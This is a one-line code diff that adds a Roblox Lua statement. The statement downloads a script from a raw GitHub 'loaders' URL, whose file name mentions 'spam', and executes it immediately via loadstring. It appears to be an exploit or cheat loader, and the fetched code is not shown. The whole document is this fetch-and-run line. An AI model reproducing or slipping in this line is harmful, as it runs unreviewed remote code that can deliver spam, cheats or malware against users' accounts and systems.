@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/anniversary-daybreak-spam5-82slo5xxijhy4r.lua"))()
